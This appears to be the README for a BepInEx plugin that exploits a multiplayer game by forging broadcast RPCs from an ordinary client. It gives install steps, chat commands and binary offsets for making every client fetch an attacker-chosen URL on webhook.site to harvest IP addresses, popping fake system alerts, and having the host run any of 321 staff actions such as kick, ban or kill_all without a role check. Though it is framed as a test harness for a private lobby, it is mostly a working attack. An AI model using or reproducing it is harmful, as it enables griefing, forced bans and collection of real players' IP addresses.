# Classic Us exploit test harness (v1.4)

BepInEx 6 (IL2CPP) plugin that fires **forged broadcast RPCs** from a normal
(non-staff, non-host) game instance, using the game's own in-game chat as the
trigger. The host/victim copy stays **100% stock**.

## Install (attacker copy only — Linux, game 2026.9.5)

```bash
# attacker game folder:
unzip BepInEx-Unity.IL2CPP-linux-x64-6.0.0-be.788.zip
mkdir -p BepInEx/plugins
cp SystemAlertSpoof.dll BepInEx/plugins/
cp auad_relay_actions.txt BepInEx/config/   # optional — auto-created on first run
./run_bepinex.sh ./classicus2026.9.5linux.x86_64
```

First launch is slow (interop generation). Confirm in `BepInEx/LogOutput.log`:

```
[ChatHarness] loaded v1.4. Commands: /xalert <msg> | /xaudio <url> | /xmusic <url> | /xstop | /xrelay <action> [args] | /xlist | /xreload | /xhelp  — relay actions loaded: 321 ...
```

> **If you see `PAL_SEHException` at startup**, you (or a previous setup) most
> likely disabled the two preload keys in `BepInEx/config/BepInEx.cfg`. Restore
> the stock defaults — both must be `true`:
>
> ```ini
> [Il2Cpp] / the section they appear in:
> PreloadIL2CPPInteropAssemblies = true
> UnityLogListening = true
> ```
>
> (An earlier experiment set these to `false` to dodge a headless-VPS crash and
> it made startup *worse* — `PAL_SEHException`/abort right after chainloader
> init. With them back to `true` the game loads plugins normally.)

## Chat commands (typed in the in-game chat of the ATTACKER instance)

| command | RPC | what the stock host does |
|---|---|---|
| `/xalert <msg>` | 13 | pops a fake **SYSTEM ALERT** on every client |
| `/xaudio <url-or-tag>` | 94 | every client HTTP-fetches + plays the URL (IP harvest) |
| `/xmusic <url-or-tag>` | 89 | every client HTTP-fetches + plays the URL |
| `/xstop` | 95 | stops custom sounds |
| `/xrelay <action> [args...]` | 97 | **host executes any staff GameAction**, no staff check |
| `/xlist [filter]` | — | lists the actions loaded from the config |
| `/xreload` | — | re-reads `BepInEx/config/auad_relay_actions.txt` |

Commands are consumed locally (never sent as chat). Multi-word values can be
quoted: `/xrelay alert "hello everyone"`.

### Long URLs don't fit in the chat box — use url aliases

The in-game chat input can't hold full links, so `/xaudio` and `/xmusic` also
accept a **short tag** looked up in the same config file. Open
`BepInEx/config/auad_relay_actions.txt` in a text editor and add a line:

```
url.sound = https://webhook.site/<token>/pwn.mp3
url.music = https://example.com/track.mp3
```

Then in chat just type:

```
/xaudio sound
/xmusic music
```

A full `http(s)://...` URL still works directly if you can type it; anything
else is treated as a `url.<tag>` lookup. The config is re-read on every `/x`
command, so no restart or `/xreload` needed after editing.

## /xrelay — the config file

`/xrelay` maps a command name to a `StaffTools.GameAction` numeric id using
`BepInEx/config/auad_relay_actions.txt` (auto-written on first run with the
full catalog — **321 actions**, generated from the decompiled enum). Lines:

```
# comment
name = id
```

Examples from the stock staff feature set:

```
kick = 0            ban = 1            disconnect = 2
alert = 38          announce = 39      countdown = 46
force_start_game = 94                  kill_all = 78
```

Usage: `/xrelay kick <playerName>` → RPC 97 → the **host** kicks that player.
`/xrelay alert hello world` → host shows a SYSTEM ALERT to the room.

How it works (verified in the 9.5 binary): the game's legit path is
staff console → `RelayToHost()` (@0x119d730) which sends
`StartRpc(netId, 97, Reliable) + Write(int32 action) + Write(string) +
Write(byte argc) + Write(string)*argc`. The receiver `HandleStaffHostActionRelayRpc`
(@0x119da90) only checks `AmHost`, then calls `Dispatch(action, args)` directly —
**no staff/role validation**. So any room member can make the host run any of
the 321 actions (kick, ban, teleport, god mode, force end-game, every
`/troll_*`, …). Test it with `/xrelay alert hello` first — if the stock host
shows the alert, the full 321-action relay is open.

## Test procedure — prove exploit #8 (remote-audio / IP harvest)

1. **Get a URL listener.** Open https://webhook.site → copy your unique
   `https://webhook.site/<token>` URL. (Any URL you control that logs HTTP
   requests works — the point is you see each victim's IP hit it.)
2. Stock copy = host → create a **private lobby**.
3. Attacker copy (BepInEx + this plugin) → join that lobby.
4. Put the URL in the config (see "url aliases" above) and in the attacker's
   chat type only:

   ```
   /xaudio sound
   ```

5. Open your webhook.site page.
   **Expected if the hole is real:** HTTP GET entries for `/pwn.mp3` — one from
   the stock host's IP (and your attacker IP), arriving within seconds of the
   command. That is the IP-harvesting proof: an attacker-chosen URL was fetched
   by every client in the room, and nobody had to click anything.

   Same test with `/xmusic ...` (RPC 89) and `/xstop` (RPC 95).

## Also testable with the same setup

- `/xalert <text>` → RPC 13 fake SYSTEM ALERT popups land on the stock host.
- `/xrelay kick <hostName>` → RPC 97 forces the *host* to kick someone — the
  original "I got kicked as host" symptom, reproduced without staff.
- `/xrelay disconnect <playerName>` → server-msg-style forced disconnect family.

## Troubleshooting

- `PAL_SEHException` at startup → restore `PreloadIL2CPPInteropAssemblies` and
  `UnityLogListening` to `true` in `BepInEx/config/BepInEx.cfg` (see above).
  Deleting `BepInEx/config/BepInEx.cfg` also works — BepInEx regenerates it
  with stock defaults.
- `Reference assemblies should not be loaded for execution` = wrong dll was
  copied (the `obj/Release/ref/` stub). Use `dist/SystemAlertSpoof.dll`
  (built from `bin/Release/`, real implementation).
- Crash/freeze **while sending a command** with an abort mentioning
  `PAL_SEHException`: v1.4 logs the managed seed if it is ours. Send the last
  ~100 lines of `BepInEx/LogOutput.log` (look for `UNHANDLED exception` /
  `first-chance exception in harness code`). To isolate whether it is the
  plugin at all: temporarily move `SystemAlertSpoof.dll` out of
  `BepInEx/plugins/` and repeat — stock+BepInEx must boot clean before the
  harness can be blamed.
- Abort right AFTER `Chainloader startup complete` (before reaching the menu):
  1. Move `SystemAlertSpoof.dll` out of `BepInEx/plugins/` and boot. Still
     crashes → BepInEx core + this game, not the plugin. Do a **clean
     reinstall** (unzipping the nightly over an old pre.2 install leaves stale
     mixed `BepInEx/core` files):
     `rm -rf BepInEx dotnet libdoorstop.so run_bepinex.sh .doorstop_version`
     then unzip `be.788` fresh, re-copy the plugin, boot. Zero-plugin clean
     boot still crashing = BepInEx 6 incompatible with this game on this
     machine → use the packet-level sender plan (no BepInEx at all).
  2. Boots clean without the plugin → the SendChat Harmony patch is implicated
     even before first use; a no-patch variant of the harness is the next build.
- Headless VPS note: BepInEx + game can abort at startup under Xvfb/llvmpipe on
  a headless VPS (environment-specific; unrelated to this plugin). Run the test
  on a desktop session where the game normally runs.
